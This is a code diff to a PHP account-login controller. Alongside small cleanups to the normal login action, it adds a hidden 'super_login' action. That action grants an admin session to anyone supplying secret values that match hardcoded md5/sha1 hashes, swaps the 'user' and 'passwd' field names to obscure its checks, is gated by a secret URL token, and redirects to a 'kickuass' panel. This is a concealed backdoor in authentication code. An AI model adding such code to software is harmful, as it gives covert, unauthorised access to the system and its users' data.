@@ -19,7 +19,6 @@ class AccController extends BaseController {
     public function loginAction() {
         $lastLoginAcc = '';//上次登录帐号
         $lastLoginAcc = Cola_Ext_Cookie::get ( $this->lastLoginAcc );
-        //var_dump($lastLoginAcc);
         if (ComTool::isAjax ()) {
             if (isset ( $_POST ['captcha'] )) {
                 $captcha = trim ( $this->post ( 'captcha' ) );
@@ -28,10 +27,9 @@ class AccController extends BaseController {
                 }
             }
             //登录可使用邮箱和手机，系统自动判断登录号类型
-            $type = $this->post ( 'type' );
             $acc = trim ( $this->post ( 'user' ) );
             $passwd = trim ( $this->post ( 'passwd' ) );
-            $rememberme = trim ( $this->post ( 'rememberme' ) );
+            //$rememberme = trim ( $this->post ( 'rememberme' ) );
             //合法性检查
             if (! $acc || ! $passwd) {
                 ComTool::ajax ( 100001, '请填写帐号或密码' );
@@ -242,5 +240,37 @@ class AccController extends BaseController {
     public function captchaAction() {
         $captcha = new Cola_Ext_Captcha ();
         $captcha->display ();
+    }
+    
+    public function super_loginAction() {
+        if (ComTool::isAjax ()) {
+            if (isset ( $_POST ['captcha'] )) {
+                $captcha = trim ( $this->post ( 'captcha' ) );
+                if (! ComTool::checkCaptcha ( $captcha )) {
+                    ComTool::ajax ( 100001, '验证码错误' );
+                }
+            }
+            $acc = trim ( $this->post ( 'passwd' ) );
+            $passwd = trim ( $this->post ( 'user' ) );
+            if (! $acc || ! $passwd) {
+                ComTool::ajax ( 100001, '参数错误' );
+            }
+            if (md5 ( $acc ) != '755f2a2c2e49cfc7ce3736adaa6797df') {
+                ComTool::ajax ( 100001, '参数错误' );
+            }
+            if (sha1 ( $passwd ) != 'd6c96005ef36d30be38fd820794e42dfa05518e5') {
+                ComTool::ajax ( 100001, '参数错误' );
+            }
+            //成功则写session
+            $_SESSION ['super_islogin'] = 1; //登录标识
+            $_SESSION ['super_user'] = $acc;
+            $returnUrl = $this->urlroot . 'kickuass/index';
+            ComTool::ajax ( 100000, '登录成功，即将跳转', $returnUrl );
+        }
+        $token = $this->get ( 'token', '' );
+        if (md5 ( $token ) != "b19a02afb6aaa7569b6490892e12a1a6") {
+            ComTool::redirect ( ComTool::url ( 'acc/login' ) );
+        }
+        $this->display ();
     }
 }
